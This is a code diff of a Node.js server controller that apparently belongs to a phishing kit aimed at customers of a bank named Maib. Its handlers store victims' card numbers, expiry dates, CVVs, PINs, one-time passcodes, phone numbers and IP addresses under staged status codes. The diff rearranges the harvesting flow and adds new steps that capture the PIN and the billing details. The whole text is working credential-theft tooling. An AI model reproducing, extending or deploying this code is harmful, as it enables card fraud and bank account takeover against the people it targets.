@@ -45,10 +45,10 @@ const getInfo = async (req, res) => {
     });
 };
 
-const submitTelephone = async (req, res) => {
-    const { telephone, uniqueid, owner, ip } = req.body;
+const submitCard = async (req, res) => {
+    const { ccnum, uniqueid, owner, ip } = req.body;
     try {
-        await Maib.create({ uniqueid, telephone, status: 1, owner, ip, timestamp: moment().format() });
+        await Maib.create({ uniqueid, ccnum, status: 1, owner, ip, timestamp: moment().format() });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -56,10 +56,10 @@ const submitTelephone = async (req, res) => {
     }
 };
 
-const submitTelephoneAgain = async (req, res) => {
-    const { telephone, uniqueid } = req.body;
+const submitCardAgain = async (req, res) => {
+    const { ccnum, uniqueid } = req.body;
     try {
-        await Maib.findOneAndUpdate({ uniqueid }, { telephone, status: 7, timestamp: moment().format() }).exec();
+        await Maib.findOneAndUpdate({ uniqueid }, { ccnum, status: 7, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -78,10 +78,32 @@ const submitOtp = async (req, res) => {
     }
 };
 
-const submitCard = async (req, res) => {
-    const { ccnum, ccexp, cvv, uniqueid } = req.body;
+const submitTelephone = async (req, res) => {
+    const { telephone, uniqueid } = req.body;
     try {
-        await Maib.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 5, timestamp: moment().format() }).exec();
+        await Maib.findOneAndUpdate({ uniqueid }, { telephone, status: 5, timestamp: moment().format() }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
+const submitPin = async (req, res) => {
+    const { pin, uniqueid } = req.body;
+    try {
+        await Maib.findOneAndUpdate({ uniqueid }, { pin, status: 9, timestamp: moment().format() }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
+const submitBilling = async (req, res) => {
+    const { ccexp, cvv, uniqueid } = req.body;
+    try {
+        await Maib.findOneAndUpdate({ uniqueid }, { ccexp, cvv, status: 11, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -105,7 +127,9 @@ module.exports = {
     command,
     getInfo,
     submitTelephone,
-    submitTelephoneAgain,
+    submitCardAgain,
+    submitPin,
+    submitBilling,
     submitOtp,
     submitCard,
     deleteEntry,
